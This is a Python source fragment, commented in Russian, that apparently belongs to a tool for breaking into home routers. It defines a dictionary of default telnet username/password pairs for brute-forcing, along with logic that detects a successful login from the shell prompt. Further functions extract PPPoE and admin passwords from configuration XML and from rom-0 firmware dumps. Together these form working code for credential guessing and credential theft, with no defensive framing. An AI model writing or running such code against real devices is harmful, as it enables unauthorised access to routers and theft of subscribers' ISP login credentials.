AUTH_MODE_LABELS = {"basic": "Basic Auth", "digest": "Digest Auth"}

# компактный телнет-словарь: заводские пары + самые частые из большого словаря
TELNET_CREDS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", ""), ("admin", "password"),
    ("admin", "1234"), ("admin", "12345"), ("root", "root"), ("root", "admin"),
    ("root", ""), ("root", "Zhone@internet#Ex"), ("root", "Zte521"), ("support", "support"),
    ("user", "user"), ("guest", "guest"), ("telecomadmin", "admintelecom"),
    ("superadmin", "SuperPassword"), ("Epuser", "userEp"), ("cisco", "cisco"),
]

TELNET_LOGIN_MARKERS = ("login:", "username:", "user name:", "user:", "name:")
TELNET_PASS_MARKERS = ("password:", "passwd:", "pass:")
TELNET_FAIL_MARKERS = ("incorrect", "invalid", "wrong", "denied", "failed", "bad password", "error")


def strip_telnet_iacs(data):
    # выкидываем управляющие последовательности telnet (IAC, WILL/WONT/DO/DONT/SB..SE)
    out = bytearray()
    i = 0
    n = len(data)
    while i < n:
        b = data[i]
        if b != 255:
            out.append(b)
            i += 1
            continue
        if i + 1 >= n:
            break
        cmd = data[i + 1]
        if cmd in (251, 252, 253, 254):
            i += 3
        elif cmd in (250,):
            se = data.find(b"\xff\xf0", i)
            i = se + 2 if se >= 0 else n
        else:
            i += 2
    return bytes(out)


def classify_telnet_reply(text):
    # вердикт по тому, что роутер напечатал после ввода пароля
    low = str(text or "").lower()
    if any(m in low for m in TELNET_FAIL_MARKERS):
        return "fail"
    if any(m in low for m in TELNET_LOGIN_MARKERS):
        return "retry"
    if any(ch in low for ch in ("#", "$", "]", ">")):
        return "success"
    return "unknown"


def extract_pppoe_credentials(xml_text):
    user = re.search(r'(?:pppoe[_-]?user(?:name)?|wan[_-]?user(?:name)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
    passw = re.search(r'(?:pppoe[_-]?pass(?:word)?|wan[_-]?pass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
    # запасной вариант: типичные теги пароля
    if not passw:
        passw = re.search(r'(?:admin[_-]?pass(?:word)?|newpass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
    user_val = user.group(1).strip() if user else ""
    pass_val = passw.group(1).strip() if passw else ""
    return user_val, pass_val


def decode_chunked_body(raw):
    # HTTP/1.1 chunked: снимаем маркеры размеров (1f2e\r\n...),
    # оставляя чистое тело; на сбое возвращаем вход как есть
    out = bytearray()
    i = 0
    while True:
        j = raw.find(b"\r\n", i)
        if j < 0:
            # маркеров нет: если и чанков не распознали — это просто тело, отдаём как есть
            return bytes(out) if out else bytes(raw)
        size_hdr = raw[i:j].split(b";")[0].strip()
        try:
            size = int(size_hdr, 16)
        except Exception:
            return bytes(raw)
        if size == 0:
            break
        out += raw[j + 2: j + 2 + size]
        i = j + 2 + size + 2  # перепрыгиваем CRLF после чанка
    return bytes(out)


def decode_rom0_secrets(body_bytes):
    # rom-0 несёт сжатые zlib-секции внутри бинарного дампа
    secrets = []
    if not body_bytes:
        return secrets
    for start in range(0, min(len(body_bytes), 8192) - 2):
        if body_bytes[start] == 0x78 and body_bytes[start + 1] in (0x01, 0x9C, 0xDA, 0x5E):
            try:
                chunk = zlib.decompressobj().decompress(body_bytes[start:start + 4096])
                if len(chunk) >= 16:
                    text = chunk.decode("latin-1", errors="replace")
                    user, passwd = extract_pppoe_credentials(text)
                    if user and passwd:
                        secrets.append((user, passwd))
                        break
            except Exception:
                continue
    return secrets


